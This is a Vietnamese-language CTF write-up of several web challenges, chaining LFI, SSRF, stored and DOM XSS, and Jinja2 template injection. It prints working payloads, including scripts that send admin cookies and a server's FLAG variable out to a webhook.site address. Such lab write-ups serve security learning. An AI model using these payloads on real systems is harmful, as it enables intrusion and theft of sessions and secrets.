# Write-up: Santa 's Shop CTF Chanllenge

# **1. Mục tiêu**

Chúng ta có một tài khoản với 100 coin. Mục tiêu là mua được món quà bí ẩn "Mystery Gift Box" có giá 99,999 coin để lấy Flag. => Vấn đề: Không đủ tiền. Cần tìm cách hack số dư hoặc hack giá tiền.

# **2. Phân tích và khai thác** 

***Lần thứ 1 :*** 
-
- Mình thử truy cập các chức năng của web:
  
  - `Trang Nạp tiền`: `Báo lỗi Error 404.` -> Hướng này bế tắc  
  - `Admin Dashboard`: Hiện thông báo `"Chỉ có thể cập nhật từ localhost"`.

**Đây là gợi ý quan trọng. Server đang kiểm tra IP người dùng, yêu cầu phải là 127.0.0.1. Nếu thoả mãn điều kiện này, ta có thể chỉnh sửa tiền mà không cần đăng nhập Admin.**

- **Khai thác thử** :
  - Vì vậy mình sẽ chọn phương án tấn công vào Admin Dashboard bằng phương pháp giả mạo IP.
  - Ấn vào Admin DashBoard rồi dùng Burpsuite bắt request đó lại rồi send to repeater ,ở đây thêm header **`X-Forward-For: 127.0.0.1`** vào Request rồi send thử nhưng nó vẫn trả về **`chỉ có thể cập nhật coin từ localhost`**.
  - Có khả năng là cái header **`X-Forward-For`** không phải là header mà Server kiểm tra . Vậy thì có thể dùng bất cứ các loại header nào mà lập trình có thể dùng để kiểm tra IP thử xem . Mình đã thử gửi tất cả các biến thể cùng 1 lúc để xem cái nào dính . Tại sao lại cần phải kiểm tra thế này ? Bởi vì server thường chỉ kiểm tra 1 trong số các header trên . Chỉ cần 1 cái đúng thì có thể bypass được 
  - Request của bạn sẽ trông như thế này.

 ```python
 GET /admin.php HTTP/1.1
Host: 67.223.119.69:5017
Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
Cookie: PHPSESSID=da28ac2586b8128e301f7508f7201f6c
Connection: keep-alive
````

   - Nhưng Server vẫn báo **`chỉ có thể cập nhật từ localhost`**.

   - **Kết luận**: Server không tin vào các Header do người dùng gửi lên. Khả năng cao Server kiểm tra biến môi trường REMOTE_ADDR ( ( _Bạn có thể hình dung như là , bạn giả IP 127.0.0.1 gửi đến server , nhưng server sẽ không tin ngay mà nó sẽ gửi một phản hồi lại địa chỉ IP 127.0.0.1 đó , nếu bạn nhận được thì server nó mới tin IP bạn gửi đó chính là biến môi trường chứa IP thực_ )


     
     

***Lần thứ 2 :***
-
-  Mình thử vào mã nguồn của trang web đọc thử thì mình nhận thấy cơ chế hiển thị hình ảnh của trang web có điểm đáng ngờ , Thay vì trỏ trực tiếp vào đường dẫn file tĩnh (ví dụ: **`<img src="/images/CandyCane.jpg">`**), thẻ img lại gọi đến một file xử lý PHP:
**`<img src="/file.php?image=resource%2Fimage%2FCandyCane.jpg">**`. Endpoint **`/file.php`** nhận tham số image để đọc file và trả về người dùng . Nếu lập trình viên kiểm tra không kĩ , chúng ta có thể lợi dụng nó để đọc source PHP của chính trang web. ( giải thích thêm cho những bạn chưa biết như mình 

   - _Giải thích thêm : `/file.php` : Đây là một file mã nguồn thực thi . `?image=...` : Đây là nguyên liệu đầu vào . Điều này chứng tỏ Server đang thực hiện quy trình: Nhận đường dẫn từ tham số image -> Đọc nội dung file đó -> Trả về cho người dùng._
- Khai thác đọc Source Code: Mình muốn xem code của **`admin.php`** để biết chính xác nó kiểm tra cái gì. Tuy nhiên, nếu request trực tiếp **`/file.php?image=admin.php`**, server sẽ thực thi file đó chứ không hiện code. => Giải pháp: Dùng **`PHP Wrapper`** để mã hóa nội dung file sang Base64 trước khi hiển thị.
   
        
   - _Giải thích thêm về **`PHP Wrapper`** cho những bạn chưa rõ như mình thì hãy tưởng tượng PHP Wrapper (`php://filter`) giống như một "bộ lọc". Bình thường, Server thấy file .php là sẽ chạy ngay lập tức. Nhưng khi đi qua bộ lọc này, code bị biến đổi thành dạng mã hóa (Base64) - tức là chỉ còn là các ký tự văn bản vô hại. Nhờ đó, Server bị "lừa" và in toàn bộ nội dung file ra màn hình thay vì thực thi nó._
 
**Payload** : **`GET /file.php?image=php://filter/convert.base64-encode/resource=admin.php HTTP/1.1`**

**Kết quả** : Server trả về một chuỗi ký tự Base64 dài. Sau khi Decode chuỗi đó, mình thu được source code của admin.php như sau
```php
<?php
require_once 'config.php';
$secret = trim(file_get_contents("/secret.txt")); // đọc file secret.txt nằm ở thư mục gốc
// đoạn này kiểm tra ip 
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '::1') {
    // http_response_code(403);
    die("Chỉ có thể cập nhật coin từ localhost !");
}
// kiểm tra tham số đầu vào -> tức là chỉ cần có username là được , ko bắt buộc phải admin
if (!isset($_GET['username']) || !isset($_GET['coin']) || !isset($_GET['secret'])) {
    die("Vui lòng nhập username, coin và SECRET");
}
// đoạn này kiểm tra secret có chính xác không
if ($secret !== $_GET['secret']){
    die("SECRET bạn nhập không chính xác.");
}
// nếu mọi thứ oke thì cập nhật tiền 
$username = trim($_GET['username']);
$coin = (int)$_GET['coin'];

try {
    $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {
        die("Không tìm thấy user: " . htmlspecialchars($username));
    }

    $stmt = $conn->prepare("UPDATE users SET coin = ? WHERE username = ?");
    $stmt->execute([$coin, $username]);

    echo "Đã cập nhật coin cho <b>{$username}</b> thành <b>{$coin}</b>!";
} catch (PDOException $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}
?>

```
- Từ code này, ta biết để hack được tiền, ta cần 2 thứ:

  - Mã Secret: Nằm trong file `/secret.txt`
  - Request từ Localhost: Phải truy cập từ `127.0.0.1`


 
#
***Lần thứ 3***
-
**Lấy secret và tấn công**

- Tận dụng lại lỗ hổng LFI ở trên để đọc file `/secret.txt`. 

**Payload**:
**`GET /file.php?image=php://filter/convert.base64-encode/resource=/secret.txt HTTP/1.1`**

**Kết quả** : Mình lại nhận được thêm một chuỗi base64 **`Q2hpQ29uMUJ1b2NOdWFUaG9pfl9+Cg==`** và sau khi decode thì nhận được chuỗi secret là **`ChiCon1BuocNuaThoi~_~`**

- Sau khi lấy được secret rồi thì cần phải truy cập từ 127.0.0.1 (Chúng ta không thể Fake IP bằng Header vì code dùng `$_SERVER['REMOTE_ADDR']` - _là một biến siêu toàn cục (superglobal) trong PHP, chứa địa chỉ IP thực của người dùng (máy khách) đang kết nối và xem trang web hoặc ứng dụng của bạn_ )

- Lợi dụng chính file.php. Nếu file.php cho phép đọc file từ URL (SSRF), chúng ta sẽ bảo server "Tự gọi chính mình". Khi server tự gọi `http://127.0.0.1/admin.php`-> Bypass thành công! Nhưng làm thế nào để biết được nó có lỗi **SSRF** hay không ? -> thì cứ thử gửi `?image=http://gooogle.com` , nếu nó hiển thị ra cả trang google thì tức là có lỗi **SSRF**.

  - Giải thích dễ hiểu hơn thì nó như thế này 
  - Giả sử `image=http://127.0.0.1/admin.php` thì ra lệnh: Hàm `file_get_contents()` trong `file.php` nhận được đường dẫn `http://127.0.0.1/admin.php`.
  - Server (đang chạy `file.php`) . Nó tự tạo một kết nối HTTP mới xuất phát từ chính nó để gửi tới địa chỉ `127.0.0.1`.
  - Trang `admin.php` nhận được request này , nó kiểm tra xem ai đang gọi đến bằng cách nhìn vào biến **REMOTE_ADDR**.
  - Vì request này do Server tự gửi đi từ bên trong, nên **REMOTE_ADDR** hiển thị là `127.0.0.1`. -> bypass thành công

- URL mục tiêu cần gọi : `http://127.0.0.1/admin.php?username=test1&coin=999999&secret=ChiCon1BuocNuaThoi~_~`, nhưng nếu ta nhúng trực tiếp url trên vào tham số image thì server sẽ hiểu rằng `&` là dấu ngắt tham số dẫn đến mất dữ liệu `coin` và `secret`. -> cần phải encoding `&` thành `%26` .

- **Payload**: **`GET /file.php?image=http://127.0.0.1/admin.php?username=test1%26coin=999999%26secret=ChiCon1BuocNuaThoi~_~`**

**Vậy là đã cập nhật đươc số tiền từ 100 lên 999999 , bây giờ chỉ cần vào lại web và mua Mystery Gift Box để xem flag thôi** 

`flag : KCSC{m3rry_chr1stm4s_4nd_h4ppy_h4ck1ng}`

# Write-up : Hori 's blog

# 1. Mục tiêu 

- Một trang web dạng Blog cho phép người dùng đăng bài viết (gồm Tiêu đề, Nội dung, và Upload ảnh). 
- Hệ thống có một trang bot.php để gửi đường dẫn cho Bot (Admin) truy cập. 
- Ngoài ra còn có trang `phpinfo.php`.
- Mục tiêu cần đạt: Lấy được Flag nằm trong Cookie của Admin (Bot).

# 2. Phân tích và khai thác 

***Lần thứ 1*** :
-
- Mình thử truy cập vào POST thì thấy có mục upload file nên nghi ngờ lỗ hổng Unrestricted File Upload 😓
- Mình thử upload một file PHP xem sao kết quả web trả về ❌ Only image files (PNG, JPG, GIF) are allowed. Vậy là Server chặn, chỉ cho phép đuôi ảnh (.jpg, .png, .gif).
- Không chịu thua , mình thử bypass bằng Double Extension và chỉnh Magic Bytes.
  
  - Đổi tên file thành `shell.php.gif` (Double Extension) Để lừa bộ lọc đuôi file: Server nhìn thấy đuôi `.gif` ở cuối cùng -> "À, đây là file ảnh, cho qua!".
  - Vì máy tính thường quản lí , đọc file các thứ dựa trên các dòng mã nhị phân nhưng nếu nó đọc hết nội dung một file thì quá lâu để có thể xử lý cho nên thường thì chỉ đọc vài byte đầu tiên để phân biệt các loại file thôi 
  - vậy nên trong cái file mình chèn vào đó , ở dòng để tiên sẽ chèn thêm GIF89a ở đầu ( đây là của file gif ) ,Khi Server đọc file, nó thấy chữ GIF89a ở đầu -> "Nội dung file này đúng chuẩn GIF rồi, không phải file rác."
- **Kết quả**: Upload thành công, nhưng khi truy cập file, Server chỉ hiển thị nó như một bức ảnh lỗi, không thực thi mã PHP.
- Tiếp tục mình lại thử bypass bằng **.htaccess** để ép server chạy file ảnh như file php nhưng lại quên mất ban đầu nó đã nói chỉ cho chạy file `.jpg` , `.png` , `.gif` . 
- Kết quả: Thất bại. Server chặn tên file , chỉ chấp nhận các đuôi mở rộng hình ảnh hợp lệ.

**Kết luận : Server được cấu hình tốt, không thể khai thác lỗ hổng Upload để chạy mã lệnh**
-
***Lần thứ 2:***
-
Dựa vào gợi ý "Flag in cookie", mục tiêu chuyển sang tấn công XSS để đánh cắp Cookie của Bot.

Đầu tiên mình thử kiểm tra xem các điểm đầu vào coi phần input nào không được bảo mật kĩ càng . Thử chèn payload đơn giản `<script>alert(1)</scrpit>` vào Title , Nội dung . 

Sau khi thử chèn vào các vị trí, mình kiểm tra Source Code và nhận được kết quả thú vị:

- Tại Tiêu đề (Title): Thất bại. Server đã mã hóa các ký tự đặc biệt. Dấu < bị biến thành `&lt`. Code không thể chạy 
- Tại Nội dung (Content): Thành công! Server giữ nguyên các thẻ HTML mà mình nhập vào ( như <script>). -> Kết luận: Lỗ hổng XSS nằm ở phần Content của bài viết.



Tiếp theo mình sẽ tạo một Webhook  đóng vai trò là server của kẻ tấn công để hứng dữ liệu trả về. Mình sử dụng Payload sau chèn vào phần Content:

`<script>
  fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c=' + document.cookie);
</script>`

- _Giải thích:_

  `<script>...</script>`: Khai báo cho trình duyệt biết đây là đoạn mã JavaScript

  `document.cookie`: Lệnh JavaScript dùng để truy xuất toàn bộ Cookie của người dùng hiện tại (ở đây là Bot).

  `fetch(...)`: Hàm trong JavaScript dùng để gửi một HTTP Request đến một địa chỉ khác

  `?c=...`: gắn giá trị Cookie lấy được vào tham số c trên URL. Khi Webhook nhận được request, chỉ cần nhìn vào URL là thấy Cookie.


  <img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/9f64dd76-549e-4da5-8228-2ecff0073c68" />


Sau khi gửi link bài viết chứa mã độc cho Bot truy cập, Webhook của mình đã không nhận được bất kì một request nào , có thể là do thẻ `<script>` nó không hoạt động 


<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/51e6384e-901d-4066-9173-99e599f9b709" />

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/a98acc73-ca5a-49ef-b1eb-3f64cfe69722" />




Sau đó mình thử chuyển sang sử dụng payload "uy tín" hơn là thẻ `<img>` kết hợp sự kiện `onerror`

- `<img src=x onerror="fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?flag='+document.cookie)">`

Giải thích câu lệnh cho các bạn dễ hiểu thì 
 - `src=x`: Đường dẫn ảnh sai, chắc chắn sẽ gây lỗi tải ảnh.

- `onerror="..."`: Khi lỗi xảy ra, trình duyệt lập tức chạy đoạn code JS bên trong dấu ngoặc kép

Sau khi gửi link bài viết chứa mã độc cho Bot truy cập , Webhook của mình lần này đã nhận được request nhưng cookie nó trả về lại là 1 chuỗi rỗng . 

Nguyên nhân: Server đã bật cờ HttpOnly cho Cookie của Admin.Vì thế, lệnh document.cookie trả về chuỗi rỗng, và chúng ta không lấy được Flag trực tiếp.

- Giải thích thềm về HttpOnly : _Là một lớp bảo vệ bảo mật được gán cho Cookie. Khi Cookie có cờ này, trình duyệt sẽ ngăn chặn JavaScript (lệnh document.cookie) đọc giá trị của nó. Mục đích chính là để giảm thiểu thiệt hại khi trang web bị lỗi XSS_.



---
***Lần thứ 3***
-
Bây giờ chỉ còn lại trang `PHPINFO` là chưa được khai thác đến 
- Quan sát: Trang này hiển thị chi tiết mọi thông tin cấu hình của PHP trên server: phiên bản PHP, hệ điều hành (OS), các module extension, và các biến môi trường...

- Mình thử Ctrl + F tìm chữ `"flag"` xem có vô tình lộ lọt gì không, nhưng kết quả là con số 0 tròn trĩnh 😓. Có vẻ Flag không nằm cố định ở đây.
Tuy nhiên, sau khi tìm hiểu thì có cơ chế hoạt động đặc biệt của hàm `phpinfo()`: `Trang phpinfo()` không chỉ hiển thị cấu hình tĩnh của server, mà nó còn in ra toàn bộ HTTP Headers của request gửi đến nó.

Điều này có nghĩa là:
 
- Nếu mình (User thường) truy cập -> Nó in Cookie của mình.
- Nếu Bot (Admin) truy cập -> Nó sẽ in Cookie của Admin (chứa Flag) ra màn hình dưới dạng văn bản (Text).
- Và quan trọng nhất: Khi Cookie đã biến thành văn bản HTML nằm trên trang web, thì JavaScript hoàn toàn có thể đọc được, bất chấp việc Cookie đó có cờ `HttpOnly` hay không (vì JS đang đọc nội dung trang web `response.text()`, chứ không phải đọc `document.cookie`).

-> Kế hoạch tấn công mới (Exploit Chain): Sử dụng lỗ hổng XSS đã tìm thấy ở phần Content, viết một đoạn mã JavaScript bắt trình duyệt của Bot thực hiện 2 việc:

- Truy cập ngầm (fetch) vào /phpinfo.php để kích hoạt việc in Cookie Admin ra Source Code.
- Đọc toàn bộ Source Code đó và gửi về Webhook của mình.

Payload (Chèn vào phần Content):

```javascript
<img src=x onerror="
    fetch('/phpinfo.php')
    .then(r => r.text())
    .then(d => {
        fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32', {
            method: 'POST',
            mode: 'no-cors',
            body: d
        })
    })
">
```
Giải thích : 
- `src=x`: Đường dẫn ảnh sai, chắc chắn sẽ gây lỗi tải ảnh.
- `onerror="..."`: Khi lỗi xảy ra, trình duyệt lập tức chạy đoạn code JS bên trong dấu ngoặc kép.
- Đoạn JS bên trong thực hiện 2 bước: (1) Đọc trộm trang `phpinfo.php` -> (2) Bắn dữ liệu về Webhook.

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/a4d00c77-4dc4-40ef-b2fd-35ffbf42f44b" />


Quay sang webhook , mình nhận về một mớ dữ liệu hỗn độn thử Ctrl + F từ flag thì thấy `FLAG=KCSC{PhP_InFO_d1sPl4Ys_c0okIe_iNf0rm4tiOn!!!}`

# 3. Bài học rút ra
Góc nhìn phòng thủ : 
-
- Phải áp dụng cơ chế làm sạch (Sanitize) và mã hóa (Encode) đầu vào trên tất cả các trường mà người dùng có thể nhập liệu. Chỉ một sơ hở nhỏ cũng dẫn đến XSS.
- HttpOnly chỉ ngăn chặn việc đọc cookie trực tiếp bằng JS (document.cookie), nhưng không ngăn chặn việc cookie bị lộ qua các kênh khác (như phpinfo, các trang debug, hoặc lỗi lộ header)
- Các file như phpinfo.php, test.php, .git, .env... là kho báu của Hacker. Luôn xóa sạch các file debug và file cấu hình thừa trước khi public website.

Góc nhìn tấn công  
- 
- Khi thấy một chỗ bị chặn (ví dụ Title bị lọc), đừng vội nản lòng. Hãy thử tất cả các đầu vào khác (Content) . Developer thường chỉ fix những chỗ "nổi bật" và bỏ quên những chỗ khuất.
- Đừng chỉ dập khuôn dùng `<script>alert(1)</script>`.
- Nếu `<script`> bị chặn hoặc không chạy (do `innerHTML`), hãy chuyển sang các thẻ khác như `<img>`, `<body>`, `<svg>` kết hợp với các sự kiện `onerror`, `onload`.
- Bài này dạy kỹ thuật kết hợp: Dùng XSS để kích hoạt lỗi lộ thông tin (phpinfo), từ đó bypass cơ chế bảo vệ (HttpOnly) để đạt mục đích cuối cùng (Lấy Cookie).
- Hiểu rằng trình duyệt luôn tự động gửi Cookie kèm theo request (kể cả HttpOnly)

- **Kết quả** : **Đã cập nhật coin cho <b>test1</b> thành <b>999999</b>!**


# Write-up: silver

# 1. Mục tiêu

- Mô tả đề: Chúng ta có một website quản lý Pokemon với chức năng "Report Team Rocket" cho phép gửi một đường dẫn (URL) để Admin (Bot) truy cập kiểm tra. Yêu cầu bắt buộc là URL phải thuộc domain nội bộ `http://localhost:5000`.
- Mục tiêu cần đạt: Đánh cắp Cookie của Admin (nơi chứa Flag) bằng cách khai thác lỗ hổng bảo mật trên website.

----
# 2. Phân tích và Khai thác

***Lần thứ 1***
-
Khi vừa vào trang web thì đọc thấy nó có dòng **We can display a personalized message for you!** (_Chúng tôi có thể hiển thị một thông điệp cá nhân hóa dành riêng cho bạn!_) . Chắc là gợi ý một điều gì đó .

Tiếp theo mình để ý là dòng **Hello, Trainer test10!** ( _vì mình lấy username là test10_ ) và ở trên URL của web `/home?name=test10` , mình nghĩ cũng có khả năng là tham số name lấy thẳng input của mình nhập vào và in ra màn hình cùng với **hello , trainer**

Mình vào thử xem source code thì thấy có một file `/static/js/script.js` 

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/a5777093-d056-4a02-a064-4699c00477c5" />



Truy cập vào thì nó ra một source code thế này 
```javascript
function getUrlParameter(name) {
    // Get parameter from URL query string
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

function displayWelcomeMessage() {
    const userName = getUrlParameter('name'); // khúc này lấy trực tiếp tham số name từ URL 
    const messageDiv = document.getElementById('user-message');
    
    if (userName) {
       // Gán trực tiếp vào HTML mà KHÔNG qua lọc rửa (sanitize)
        messageDiv.innerHTML = '<h3>Hello, Trainer ' + userName + '!</h3>';
        messageDiv.innerHTML += '<p>Welcome to the PokeCenter!</p>';
    } else {
        messageDiv.innerHTML = '<p>Add your name to the URL to get a personalized greeting!</p>';
    }
}

// Execute when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    displayWelcomeMessage();
});
```

- Việc sử dụng innerHTML kết hợp với dữ liệu lấy từ URL (userName) cho phép chúng ta chèn mã HTML/JavaScript độc hại.
- Lưu ý quan trọng: Khi dùng innerHTML trong HTML5, thẻ `<script>...</script>` sẽ không chạy. Thay vào đó, chúng ta phải dùng các thẻ HTML có sự kiện (event handlers) như `<img>` (với `onerror`) hoặc `<svg>` (với `onload`).

Mình chuẩn bị một link webhook và payload mình sử dụng là : 

`<img src=x onerror="fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c='+document.cookie)">`

**Giải thích** : Mình sẽ dùng thẻ `<img>` bị lỗi nguồn (`src=x`) để kích hoạt sự kiện `onerror`. Khi lỗi xảy ra, nó sẽ chạy lệnh **fetch** gửi Cookie của Admin về Webhook của mình.

URL hoàn chỉnh nó sẽ như thế này : **`http://localhost:5000/?name=<img src=x onerror="fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c='+document.cookie)">`**

Rồi quay lại trang Report Team Rocket truyền URL đấy vào 
- Giải thích luồng hoạt động của cách trên : 
  - Bạn gửi link cho Admin.
  - Admin (Bot) mở link đó trên trình duyệt nội bộ (`localhost:5000`).
  - Trình duyệt của Admin chạy file `script.js`.
  - `script.js` lấy đoạn mã độc `<img...>` từ URL và nhét vào trang web bằng innerHTML
  - Trình duyệt thấy thẻ `img` có `src=x` (đường dẫn sai) -> kích hoạt `onerror`.
  - Lệnh **fetch** chạy, lấy `document.cookie` (chứa **session/flag** của Admin) và gửi ra ngoài cho bạn.

Nhưng kết quả là webhook của mình im ắng trống rỗng v , lúc đầu mình nghĩ chắc là do URL encoding .

Khi bạn dán link có chứa dấu cách (space), dấu ngoặc kép " hoặc dấu < > vào URL, trình duyệt hoặc con Bot có thể cắt đứt chuỗi đó khiến code JS không chạy được trọn vẹn.

Mình thử gửi lại bằng một URL mới đã được encoding : 

`http://localhost:5000/?name=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27https%3A%2F%2Fwebhook.site%2F997f8339-d7fc-4ad3-a257-9bc92ba45d32%3Fcookie%3D%27%2Bdocument.cookie)%22%3E`

Nhưng mà kết quả là webhook nó vẫn im ắng không thấy báo vì mặc dù trang Report đã hiển thị `Admin is visiting your URL`.

Mình vẫn nghĩ chắc là tại Đôi khi trình duyệt của Admin (Bot) chặn việc gửi request fetch sang domain lạ (CORS policy)

Rồi mình dùng lệnh Chuyển hướng thay vì **fetch**. Cách này ép trình duyệt của Admin phải bay sang Webhook của bạn ngay lập tức.

Payload thô:  `<img src=x onerror="window.location='https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c='+document.cookie">`

URL encoding : `http://localhost:5000/?name=%3Cimg%20src%3Dx%20onerror%3D%22window.location%3D%27https%3A%2F%2Fwebhook.site%2F997f8339-d7fc-4ad3-a257-9bc92ba45d32%3Fc%3D%27%2Bdocument.cookie%22%3E`

Nhưng mà kết quả vẫn như cũ , webhook không có động tĩnh gì 

---
***Lần thứ 2***
-
Lúc này mình chợt nhớ lại cái trang cũ có thể thực hiện javascript lấy tham số trực tiếp **name** chính là `/home` và mình thử lại cho chắc 

Thử 1 câu lệnh đơn giản truyền vào sau tham số **name** : `<img src=x onerror=alert(1)>`

Kết quả là nó hiện lên thẻ thông báo **1** thật 

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/91521de8-0754-40ab-b769-a81ce2ebbc50" />


Mình thử tiếp xem server có bật HttpOnly hay không 

`<img%20src=x%20onerror=alert(document.cookie)>`

Thì nó có trả về PHPSESSID=... , session=..... , Vậy tức là HttpOnly đang tắt , trình duyệt cho phép JS đọc cookie 

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/80b1a6ee-2398-4633-9183-6ebdc93b018a" />


Kết luận rằng : nãy giờ mình đã cố test ở trang chủ `/` , tại sao chi tiết này lại quyết định tất cả? Bởi vì đó là 2 đường dẫn hoàn toàn khác nhau `http://localhost:5000/` và `http://localhost:5000/home`

- Nếu lỗi XSS (đoạn mã script.js xử lý name) chỉ được lập trình để chạy trên trang `/home`, thì khi bạn lùa con Bot vào trang `/`, nó sẽ chỉ thấy một trang trắng hoặc trang giới thiệu vô hại -> Không có XSS -> Không mất Cookie.

Payload chốt hạ : 
`http://localhost:5000/home?name=%3Cimg%20src%3Dx%20onerror%3D%22window.location.href='https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c='%2Bdocument.cookie%22%3E`  

Phải truyền đúng vào `/home` nha -> Kết quả webhook trả về : `session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.aT0LTA.aJ3bMLAH9uzfgtLAIBJjzNAJbp4` 

Giải mã thì nó ra : `"role":"admin","username":"admin"`

Mình vào lại trang web , bật f12 , chọn tab Application , chọn cookie và thay đổi giá trị cookie hiện tại của mình bằng cookie mới tìm được thì mình login vào được quyền **Admin**

---
***Lần thứ 3***
-
Sau khi vào đây thì mình tải về được 1 file có tên là **backup**

Vậy là 1 bài từ Blackbox lại chuyển thành Whitebox 

Mình thử vào file `docker-compose.yaml` thì thấy đoạn code 

```yaml
version: '3.8'

services:
  web:
    build: .
    ports:
      - "5000:5000"
    environment:
      - ADMIN_PASSWORD=admin123
      - FLAG=KCSC{REDACTED}
```
**Kết luận**: Flag nằm trong Biến môi trường (Environment Variable) của hệ thống, không phải trong file txt.

**Mục tiêu**: Chúng ta cần thực thi lệnh env hoặc printenv trên server để in ra danh sách biến môi trường.

Tiếp theo mình đọc source code trong file **app.py** thì có 
```python
@app.route('/admin/report-generator', methods=['GET', 'POST'])
@admin_required
def report_generator():
    # ...
    data = request.json
    template_content = data.get('template', '')

    # Ràng buộc 1: Giới hạn 55 ký tự
    if len(template_content) > 55:
        return jsonify({'error': 'Template too long (max 55 chars)'}), 400

    try:
        # Lỗ hổng: Render trực tiếp chuỗi người dùng nhập vào
        render_template_string(template_content)
    except Exception:
        pass
    
    # Ràng buộc 2: Không in kết quả ra màn hình (Blind)
    return jsonify({ 'success': True, ... }), 200
```
Trong Flask (Python), hàm này không chỉ đơn thuần là "in chữ ra màn hình". Nó đóng vai trò là một Bộ biên dịch (Compiler) mini.
 
 - Nhiệm vụ của nó: Đọc một chuỗi văn bản, tìm các ký tự đặc biệt (như {{ ... }}), tính toán/chạy code bên trong đó, rồi mới trả về kết quả cuối cùng.
 - Ví dụ: Nếu bạn đưa cho nó chuỗi `"Xin chào {{ 6*6 }}"`, nó sẽ không in ra y nguyên. Nó sẽ tính toán `6*6=36` và in ra `"Xin chào 36"`.

Lỗ hổng xảy ra author : dunvu0  đã lấy trực tiếp những gì bạn nhập (template_content) và ném thẳng vào bộ biên dịch này mà không kiểm tra.

Vậy giờ quy trình tấn công sẽ như thế này : 

 - Khi bạn gửi đoạn payload (ví dụ {{ 7*7 }} hoặc lệnh Python)
 - Input: Code nhận chuỗi từ `data.get('template')`.
 - Execution: Hàm render_template_string nhìn thấy dấu ngoặc nhọn `{{ ... }}`.

Nó hiểu rằng: "À, đây là code Jinja2 (ngôn ngữ template của Python), mình phải chạy nó!".
 
 - Thay vì chỉ cộng trừ nhân chia, mình sẽ dùng các đối tượng đặc biệt có sẵn trong Python như config, self, __globals__ để mò mẫm ra module os (hệ điều hành).
 - Lúc này có thể chạy lệnh Linux (như ls, cat, curl) ngay trên server.


Bước 1: Chuẩn bị lệnh Python độc hại Lệnh này sẽ lấy biến môi trường FLAG và gửi đến Webhook của mình.

**Payload** : 
```python
python -c "import urllib.request,os; urllib.request.urlopen('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?flag='+os.environ.get('FLAG'))"
```

Bước 2: Cấu hình Request trong Burp Suite Repeater tạo một request POST tới /admin/report-generator với nội dung như sau:
```http
POST /admin/report-generator?a=python%20-c%20%22import%20urllib.request%2Cos%3B%20urllib.request.urlopen(%27https%3A%2F%2Fwebhook.site%2F997f8339-d7fc-4ad3-a257-9bc92ba45d32%3Fflag%3D%27%2Bos.environ.get(%27FLAG%27))%22 HTTP/1.1
Host: 67.223.119.69:32880
Content-Type: application/json
Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.aT0LTA.aJ3bMLAH9uzfgtLAIBJjzNAJbp4
Content-Length: 62

{"template": "{{url_for.__globals__.os.popen(request.args.a)}}"}
```
- `?a=python%20-c...`: mình nhét toàn bộ lệnh Python vào tham số `a`.
- `Cookie`: Bắt buộc phải kèm session của Admin lấy được từ bước trước để vượt qua @admin_required.
```python
def admin_required(f):
    """Decorator to check if user is admin"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        // kiểm tra xem có session username không?
        // (Flask tự động giải mã Cookie bạn gửi lên để lấy thông tin này)
        if not session.get('username'):
            if request.is_json:
                return jsonify({"error": "Authentication required"}), 401
            return redirect(url_for('login'))
        
        // lấy thông tin user từ Database dựa trên username trong Cookie
        username = session.get('username')
        user = get_user(username)
        
        # Kiểm tra cột 'role'
        if not user or user.get('role') != 'admin':
            if request.is_json:
                return jsonify({"error": "Admin access required"}), 403
            return jsonify({"error": "Forbidden: Admin access only"}), 403
        
        return f(*args, **kwargs)
    return decorated_function
```
- `{"template": "{{url_for.__globals__.os.popen(request.args.a)}}"}`: Nó ngắn gọn, hợp lệ, và nhiệm vụ duy nhất là bảo server: "Hãy chạy lệnh nằm trong tham số a của URL đi!". 

Bước 3: Gửi và nhận Flag Sau khi bấm Send, server trả về {"success": true} (dù server không hiện kết quả lệnh, nhưng lệnh đã chạy ngầm).
 
Mình quay sang tab Webhook.site kiểm tra và thấy một request gửi tới kèm theo Flag!
`KCSC{G0tt4_h4ck_'3m_4ll!}`

----
# 3. Bài học rút ra 
- Không bao giờ tin đầu vào người dùng

Ở Client-side (Lỗi XSS): Lập trình viên đã lấy tham số name từ URL và nhét thẳng vào `innerHTML` mà không qua lọc rửa (sanitize).

Ở Server-side (Lỗi SSTI): Lập trình viên đã lấy chuỗi `JSON template` và ném thẳng vào hàm `render_template_string()`.

- Luôn luôn set HttpOnly=True cho các cookie quan trọng (Session ID, Token).


# Write-up : Hoshino Portol

# 1. Mục tiêu 
- Mô tả đề bài: Chúng ta được cung cấp mã nguồn (Source code) của một website có chức năng **Đăng ký**, **Đăng nhập** và **Quên mật khẩu**. Trong Database có sẵn tài khoản *admin* giữ **Flag** nhưng ta không biết mật khẩu.

- Mục tiêu cần đạt: Tìm cách đăng nhập được vào tài khoản admin để truy cập trang `/admin/flag` và lấy cờ (Flag).


